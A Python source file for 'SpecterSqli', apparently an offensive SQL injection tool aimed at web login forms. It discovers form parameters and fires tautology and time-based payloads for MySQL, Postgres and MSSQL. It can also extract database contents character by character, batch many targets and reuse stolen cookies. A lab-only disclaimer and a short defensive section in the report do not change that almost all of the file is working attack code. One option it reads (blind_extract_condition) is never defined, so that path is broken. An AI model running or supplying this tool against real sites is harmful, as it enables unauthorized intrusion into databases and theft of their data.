#!/usr/bin/env python3
"""
SpecterSqli - concurrent SQLi scanner with parameter discovery, blind boolean extraction,
HTML timing charts, JSON & cookie support, and comparison mode.

Usage examples:
    python3 specter_sqli.py --target http://10.0.2.15:5000/login.php
    python3 specter_sqli.py --targets-file endpoints.txt --concurrency 10 --workers 8
    python3 specter_sqli.py --target http://10.0.2.15:5000/login.php --compare http://10.0.2.20:5000/login.php
    python3 specter_sqli.py --target http://10.0.2.15:5000/login.php --json
    python3 specter_sqli.py --target http://10.0.2.15:5000/login.php --blind-extract "information_schema.tables" --maxlen 20

Note:
 - This tool is for authorized lab/testing only.
 - Dependencies: requests, beautifulsoup4, matplotlib
   Install: pip3 install requests beautifulsoup4 matplotlib
"""

import argparse
import concurrent.futures
import json
import os
import re
import sys
import time
import traceback
import base64
import io
from urllib.parse import urlparse, urljoin, parse_qs

import requests
from bs4 import BeautifulSoup
import matplotlib.pyplot as plt

# ---------- CONFIG ----------
DEFAULT_TIMEOUT = 6
DEFAULT_SLEEP = 4
LOGFILE = "specter_results.json"
HTML_REPORT = "specter_report.html"
USER_AGENT = "SpecterSqli/1.0"
# ---------- END CONFIG ----------

# Payloads
BOOLEAN_PAYLOADS = [
    ("Classic OR true", "alice' OR '1'='1' -- -"),
    ("Numeric OR true", "alice' OR 1=1 -- -"),
    ("Tautology double quote", "\" OR \"\" = \""),
]

TIME_PAYLOADS = [
    # MySQL
    ("mysql", "alice' OR IF({COND}, SLEEP({N}), 0) -- -"),
    ("mysql", "alice' OR (SELECT IF({COND}, SLEEP({N}), 0)) -- -"),
    # Postgres
    ("postgres", "alice' OR (SELECT CASE WHEN {COND} THEN pg_sleep({N}) ELSE pg_sleep(0) END) -- -"),
    # MSSQL (WAITFOR DELAY) - may need quoting tweaks
    ("mssql", "alice' ; IF ({COND}) WAITFOR DELAY '0:00:{N}' -- -"),
]

SQL_ERROR_REGEXES = [
    r"SQL syntax",
    r"mysql_fetch",
    r"mysql_num_rows",
    r"ORA-",
    r"PG::",
    r"syntax error at or near",
    r"SQLSTATE",
    r"Warning: mysql_",
    r"Unhandled Exception",
]


# -------------- Helpers --------------
def is_probably_json(text):
    try:
        json.loads(text)
        return True
    except Exception:
        return False


def contains_sql_error(text):
    if not text:
        return False
    for rx in SQL_ERROR_REGEXES:
        if re.search(rx, text, re.IGNORECASE):
            return True
    return False


def timestamp():
    return time.strftime("%Y-%m-%d %H:%M:%S")


# -------------- Network utils --------------
def normal_post(session, url, data=None, json_body=None, headers=None, timeout=DEFAULT_TIMEOUT, allow_redirects=True):
    kwargs = {"timeout": timeout, "allow_redirects": allow_redirects}
    if headers:
        kwargs["headers"] = headers
    if json_body is not None:
        return session.post(url, json=json_body, **kwargs)
    else:
        return session.post(url, data=data, **kwargs)


def baseline_request(session, url, timeout=DEFAULT_TIMEOUT, json_mode=False):
    try:
        t0 = time.time()
        if json_mode:
            r = normal_post(session, url, json_body={"username": "normaluser", "password": "normalpass"}, timeout=timeout)
        else:
            r = normal_post(session, url, data={"username": "normaluser", "password": "normalpass"}, timeout=timeout)
        dt = time.time() - t0
        return {
            "ok": True,
            "status": r.status_code,
            "length": len(r.text or ""),
            "time": dt,
            "sample": (r.text or "")[:200],
            "headers": dict(r.headers),
            "is_json": is_probably_json(r.text or "")
        }
    except Exception as e:
        return {"ok": False, "error": str(e)}


# -------------- Parameter discovery (GET/POST) --------------
def discover_params(session, url, timeout=DEFAULT_TIMEOUT):
    """
    - Fetch the page (GET)
    - Parse forms and inputs
    - Return list of candidate parameters for GET and POST
    """
    try:
        r = session.get(url, timeout=timeout)
    except Exception as e:
        return {"error": str(e)}

    forms = []
    soup = BeautifulSoup(r.text or "", "html.parser")
    for form in soup.find_all("form"):
        form_action = form.get("action") or url
        method = (form.get("method") or "get").lower()
        inputs = {}
        for inp in form.find_all(["input", "textarea", "select"]):
            name = inp.get("name")
            if not name:
                continue
            typ = inp.get("type") or inp.name
            value = inp.get("value") or ""
            inputs[name] = {"type": typ, "value": value}
        forms.append({"action": urljoin(url, form_action), "method": method, "inputs": inputs})
    # fallback: try to parse query string params in the URL
    qparams = {}
    parsed = urlparse(url)
    if parsed.query:
        qparams = parse_qs(parsed.query)
    return {"forms": forms, "query_params": qparams, "page_sample": (r.text or "")[:500]}


# -------------- Boolean tests --------------
def run_boolean_tests(session, url, param_name_candidates, baseline, json_mode=False, timeout=DEFAULT_TIMEOUT):
    """
    For each candidate parameter name, test boolean payloads in POST and GET.
    Return findings list.
    """
    findings = []
    for pname in param_name_candidates:
        for desc, payload in BOOLEAN_PAYLOADS:
            # Build data either as form or JSON depending on json_mode
            if json_mode:
                data = {pname: payload, "password": "x"}
                headers = {"Content-Type": "application/json"}
                t0 = time.time()
                try:
                    r = normal_post(session, url, json_body=data, headers=headers, timeout=timeout)
                    dt = time.time() - t0
                except Exception as e:
                    findings.append({"param": pname, "payload": payload, "method": "json", "error": str(e)})
                    continue
            else:
                data = {pname: payload, "password": "x"}
                t0 = time.time()
                try:
                    r = normal_post(session, url, data=data, timeout=timeout)
                    dt = time.time() - t0
                except Exception as e:
                    findings.append({"param": pname, "payload": payload, "method": "form", "error": str(e)})
                    continue

            body = r.text or ""
            likely = False
            if contains_sql_error(body):
                likely = True
            # length/time heuristics
            if baseline.get("length") is not None and abs(len(body) - baseline["length"]) > max(20, 0.05 * baseline["length"]):
                likely = True
            for kw in ("welcome", "dashboard", "logout", "profile", "admin"):
                if kw in body.lower():
                    likely = True
            findings.append({
                "param": pname,
                "payload_desc": desc,
                "payload": payload,
                "method": "json" if json_mode else "form",
                "status": r.status_code,
                "length": len(body),
                "time": dt,
                "likely_success": likely,
                "sql_error": contains_sql_error(body)
            })
    return findings


# -------------- Time-based / Blind tests --------------
def run_time_tests(session, url, param_name_candidates, baseline, sleep_seconds=DEFAULT_SLEEP, json_mode=False, timeout=DEFAULT_TIMEOUT):
    """
    For each candidate parameter and each template, run a true/false time-based test.
    """
    results = []
    for pname in param_name_candidates:
        for db, templ in TIME_PAYLOADS:
            try:
                # true payload
                payload_true = templ.format(COND="1=1", N=sleep_seconds)
                payload_false = templ.format(COND="1=0", N=sleep_seconds)
            except Exception:
                continue

            # Construct bodies
            if json_mode:
                body_true = {pname: payload_true, "password": "x"}
                body_false = {pname: payload_false, "password": "x"}
                headers = {"Content-Type": "application/json"}
            else:
                body_true = {pname: payload_true, "password": "x"}
                body_false = {pname: payload_false, "password": "x"}
                headers = None

            # send false (quick) then true (delayed)
            try:
                t0 = time.time()
                if json_mode:
                    r_false = normal_post(session, url, json_body=body_false, headers=headers, timeout=timeout)
                else:
                    r_false = normal_post(session, url, data=body_false, timeout=timeout)
                tf = time.time() - t0
            except Exception as e:
                results.append({"param": pname, "db": db, "error": f"false-request failed: {e}"})
                continue

            try:
                t0 = time.time()
                # Increase timeout to allow sleep
                if json_mode:
                    r_true = normal_post(session, url, json_body=body_true, headers=headers, timeout=timeout + sleep_seconds + 2)
                else:
                    r_true = normal_post(session, url, data=body_true, timeout=timeout + sleep_seconds + 2)
                tt = time.time() - t0
            except Exception as e:
                results.append({"param": pname, "db": db, "error": f"true-request failed: {e}"})
                continue

            likely = (tt - tf) > (sleep_seconds * 0.6)
            results.append({
                "param": pname,
                "db": db,
                "true_time": tt,
                "false_time": tf,
                "baseline_time": baseline.get("time"),
                "likely_time_sqli": likely,
                "payload_true": payload_true[:500],
                "payload_false": payload_false[:500]
            })
    return results


# -------------- Blind boolean extraction (per-character) --------------
def blind_extract(session, url, param, condition_template, charset=None, maxlen=32, sleep_seconds=1, json_mode=False, timeout=DEFAULT_TIMEOUT):
    """
    Basic blind boolean extraction for lab use.
    - condition_template should be something like: "SUBSTRING((SELECT database()),{pos},1)='{ch}'"
      but we will accept a template using {pos} and {char} placeholders.
    Example template (MySQL): "ASCII(SUBSTRING((SELECT database()),{pos},1))={ascii}"
    Or boolean form: "SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),{pos},1)='{char}'"
    WARNING: This is slow. Use only in lab environments.
    """
    if charset is None:
        charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@{}-.:/"

    found = ""
    for pos in range(1, maxlen + 1):
        matched_char = None
        for ch in charset:
            # Build condition replacing placeholders {pos} and {char}
            cond = condition_template.format(pos=pos, char=ch, ascii=ord(ch))
            # Build payload that makes condition true cause a delay OR true response difference
            # Prefer time-based template: using MySQL IF => SLEEP
            payload = f"alice' OR IF({cond}, SLEEP({sleep_seconds}), 0) -- -"
            if json_mode:
                body = {param: payload, "password": "x"}
                headers = {"Content-Type": "application/json"}
                t0 = time.time()
                try:
                    r = normal_post(session, url, json_body=body, headers=headers, timeout=timeout + sleep_seconds + 2)
                    dt = time.time() - t0
                except Exception as e:
                    return {"error": f"request error pos={pos} char={ch}: {e}", "found": found}
            else:
                body = {param: payload, "password": "x"}
                t0 = time.time()
                try:
                    r = normal_post(session, url, data=body, timeout=timeout + sleep_seconds + 2)
                    dt = time.time() - t0
                except Exception as e:
                    return {"error": f"request error pos={pos} char={ch}: {e}", "found": found}

            # If it's delayed (approx) we assume the char matched
            if dt > (sleep_seconds * 0.6):
                matched_char = ch
                found += ch
                print(f"[+] pos {pos} -> '{ch}' (dt={dt:.2f}s)")
                break
        if not matched_char:
            # No char matched => stop
            print(f"[-] No match at position {pos}; stopping.")
            break
    return {"extracted": found}


# -------------- HTML Report (with charts) --------------
def make_timing_chart_png(timings, title="Response times"):
    """
    timings: list of dicts with keys 'label' and 'time'
    Returns PNG bytes (base64-able)
    """
    labels = [t["label"] for t in timings]
    times = [t["time"] for t in timings]
    plt.figure(figsize=(max(6, len(labels) * 0.6), 4))
    plt.title(title)
    plt.xlabel("Test")
    plt.ylabel("Seconds")
    plt.grid(True, linestyle="--", linewidth=0.5)
    plt.plot(labels, times, marker="o")
    buf = io.BytesIO()
    plt.tight_layout()
    plt.savefig(buf, format="png")
    plt.close()
    buf.seek(0)
    return buf.read()


def build_html_report(results, outfile=HTML_REPORT):
    """Create a simple HTML file summarizing results and embedding timing charts."""
    header = f"<h1>SpecterSqli report</h1><p>Generated: {timestamp()}</p>"
    sections = [header]

    # Boolean findings
    if results.get("boolean_findings"):
        sections.append("<h2>Boolean findings</h2><ul>")
        for f in results["boolean_findings"]:
            sections.append("<li><pre>" + json.dumps(f, indent=2) + "</pre></li>")
        sections.append("</ul>")

    # Time tests
    if results.get("time_findings"):
        sections.append("<h2>Time-based findings</h2><ul>")
        for t in results["time_findings"]:
            sections.append("<li><pre>" + json.dumps(t, indent=2) + "</pre></li>")
        sections.append("</ul>")

        # Build a simple chart for true vs false times if available
        timings = []
        for idx, t in enumerate(results["time_findings"]):
            label = f"{t.get('param')}|{t.get('db')}"
            # choose the true_time if present else baseline time
            ct = t.get("true_time") or t.get("baseline_time") or 0
            timings.append({"label": label, "time": ct})
        if timings:
            png = make_timing_chart_png(timings, title="True-time per test (s)")
            b64 = base64.b64encode(png).decode("ascii")
            sections.append("<h3>Timing chart (true-time)</h3>")
            sections.append(f'<img src="data:image/png;base64,{b64}" alt="timing chart" />')

    # Blind extraction
    if results.get("blind"):
        sections.append("<h2>Blind extraction</h2><pre>" + json.dumps(results["blind"], indent=2) + "</pre>")

    # Defensive guidance
    sections.append("<h2>Defensive guidance</h2><ul>")
    for s in (
        "Use parameterized queries / prepared statements.",
        "Do not reveal DB errors in responses; sanitize/monitor logs.",
        "Consider WAF rules for known tautologies and time-based probes.",
        "Rate-limit POST requests and suspicious traffic patterns.",
        "Log suspicious payloads with source IP and timestamps (redact PII)."
    ):
        sections.append("<li>" + s + "</li>")
    sections.append("</ul>")

    html = "<html><body>" + "\n".join(sections) + "</body></html>"
    with open(outfile, "w") as f:
        f.write(html)
    return outfile


# -------------- Orchestration per-target --------------
def analyze_target(url, opts):
    """
    Run discovery, baseline, boolean, time tests on a single target.
    Returns a dict with all collected data.
    """
    session = requests.Session()
    session.headers.update({"User-Agent": USER_AGENT})
    if opts.cookies:
        # load cookies from a simple JSON file path provided (if exists)
        if os.path.exists(opts.cookies):
            try:
                with open(opts.cookies, "r") as f:
                    ck = json.load(f)
                jar = requests.cookies.RequestsCookieJar()
                for k, v in ck.items():
                    jar.set(k, v)
                session.cookies = jar
                print("[*] Loaded cookies from", opts.cookies)
            except Exception as e:
                print("[!] Failed to load cookies:", e)

    json_mode = opts.json or url.lower().endswith(".json") or False

    out = {"url": url, "discovery": None, "baseline": None, "boolean_findings": [], "time_findings": [], "blind": None}

    # Discover params
    disc = discover_params(session, url, timeout=opts.timeout)
    out["discovery"] = disc

    # Candidate param names
    candidates = set()
    # common default candidates
    for n in ("username", "user", "u", "email", "login", "password", "pass"):
        candidates.add(n)
    # add discovered form inputs
    if isinstance(disc, dict) and disc.get("forms"):
        for f in disc["forms"]:
            for name in f["inputs"].keys():
                candidates.add(name)
    # query params
    if isinstance(disc, dict) and disc.get("query_params"):
        for name in disc["query_params"].keys():
            candidates.add(name)

    candidates = sorted(list(candidates))
    out["candidates"] = candidates

    # Baseline
    base = baseline_request(session, url, timeout=opts.timeout, json_mode=json_mode)
    out["baseline"] = base
    if not base.get("ok", True):
        return out

    # Boolean tests
    boolean = run_boolean_tests(session, url, candidates, base, json_mode=json_mode, timeout=opts.timeout)
    out["boolean_findings"] = boolean

    # Time tests
    time_f = run_time_tests(session, url, candidates, base, sleep_seconds=opts.sleep, json_mode=json_mode, timeout=opts.timeout)
    out["time_findings"] = time_f

    # Blind extraction (optional)
    if opts.blind_extract:
        # user supplies a condition template; we support a few helpers e.g. {pos} and {char}
        cond_template = opts.condition_template or opts.blind_extract_condition or "ASCII(SUBSTRING(({expr}),{pos},1))={ascii}"
        expr = opts.blind_extract  # user-supplied expression like "SELECT database()" or full subquery
        # Replace placeholder {expr} in template if used
        if "{expr}" in cond_template:
            cond_template = cond_template.replace("{expr}", expr)
        # We will call blind_extract with condition_template that uses {pos} and {char} or {ascii}
        b = blind_extract(session, url, opts.blind_param or candidates[0], cond_template, charset=opts.charset, maxlen=opts.maxlen, sleep_seconds=opts.sleep, json_mode=json_mode, timeout=opts.timeout)
        out["blind"] = b

    return out


# -------------- CLI --------------
def parse_args():
    p = argparse.ArgumentParser(prog="SpecterSqli", description="Concurrent SQLi scanner with discovery, timing, blind extraction, JSON & cookie support.")
    p.add_argument("--target", help="Single target URL (e.g. http://10.0.2.15:5000/login.php)", default=None)
    p.add_argument("--targets-file", help="File containing one target URL per line", default=None)
    p.add_argument("--compare", help="Optional second target URL to compare against", default=None)
    p.add_argument("--concurrency", help="Scan multiple endpoints concurrently from targets-file (toggle)", action="store_true")
    p.add_argument("--workers", help="Max worker threads (default 6)", type=int, default=6)
    p.add_argument("--timeout", help="Request timeout seconds", type=int, default=DEFAULT_TIMEOUT)
    p.add_argument("--sleep", help="Seconds for time-based payloads", type=int, default=DEFAULT_SLEEP)
    p.add_argument("--json", help="Treat endpoint as JSON API (send JSON bodies)", action="store_true")
    p.add_argument("--cookies", help="Path to JSON file with cookies to load (key->value)", default=None)
    p.add_argument("--blind-extract", help="Run blind-extract: provide SQL expression to extract (e.g. 'SELECT database()')", default=None)
    p.add_argument("--blind-param", help="Parameter name to use for blind extraction (default: discovered candidate)", default=None)
    p.add_argument("--condition-template", help="Condition template using {pos} {char} {ascii} or {expr}", default=None)
    p.add_argument("--charset", help="Charset for blind extraction", default=None)
    p.add_argument("--maxlen", help="Max length to extract in blind extraction", type=int, default=32)
    p.add_argument("--output", help="JSON output filename", default=LOGFILE)
    p.add_argument("--report", help="HTML report filename", default=HTML_REPORT)
    p.add_argument("--quiet", help="Less console output", action="store_true")
    return p.parse_args()


def main():
    opts = parse_args()

    targets = []
    if opts.targets_file:
        if not os.path.exists(opts.targets_file):
            print("[!] targets file not found:", opts.targets_file)
            sys.exit(1)
        with open(opts.targets_file, "r") as f:
            for line in f:
                s = line.strip()
                if s:
                    targets.append(s)
    if opts.target:
        targets.append(opts.target)

    if not targets:
        print("[!] No targets specified. Use --target or --targets-file.")
        sys.exit(1)

    # concurrency: if more than one target and --concurrency, use thread pool
    results = []
    start = time.time()
    if opts.concurrency and len(targets) > 1:
        print(f"[*] Running in concurrent mode with {opts.workers} workers on {len(targets)} targets")
        with concurrent.futures.ThreadPoolExecutor(max_workers=opts.workers) as ex:
            futs = {ex.submit(analyze_target, t, opts): t for t in targets}
            for fut in concurrent.futures.as_completed(futs):
                t = futs[fut]
                try:
                    res = fut.result()
                except Exception as e:
                    res = {"url": t, "error": str(e), "trace": traceback.format_exc()}
                results.append(res)
                if not opts.quiet:
                    print(f"[+] Completed: {t}")
    else:
        for t in targets:
            if not opts.quiet:
                print(f"[*] Scanning: {t}")
            res = analyze_target(t, opts)
            results.append(res)

    # If compare specified, run compare (both sequentially)
    compare_results = None
    if opts.compare:
        if not opts.quiet:
            print("[*] Running comparison with", opts.compare)
        a = analyze_target(targets[0], opts)
        b = analyze_target(opts.compare, opts)
        compare_results = {"A": a, "B": b}

    # Collate brief summary and save
    out = {"generated": timestamp(), "targets": targets, "results": results, "compare": compare_results}
    with open(opts.output, "w") as f:
        json.dump(out, f, indent=2)
    print(f"[+] Results saved to {opts.output}")

    # Build HTML report using the first target's consolidated findings
    primary = results[0] if results else {}
    html_in = {
        "boolean_findings": primary.get("boolean_findings"),
        "time_findings": primary.get("time_findings"),
        "blind": primary.get("blind")
    }
    rpt = build_html_report(html_in, outfile=opts.report)
    print(f"[+] HTML report written to {rpt}")

    elapsed = time.time() - start
    print(f"[*] Done in {elapsed:.1f}s")


if __name__ == "__main__":
    main()
